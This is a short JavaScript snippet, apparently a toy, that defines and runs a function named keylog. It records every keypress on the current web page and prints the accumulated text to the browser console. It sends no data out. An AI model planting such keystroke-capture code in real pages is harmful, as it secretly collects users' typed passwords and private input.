function keylog(){
	var log = "";
	document.onkeypress = function klog(event){
		key = String.fromCharCode(event.keyCode);
		log += key
		console.log(log);
	}
}

keylog();
void 0;
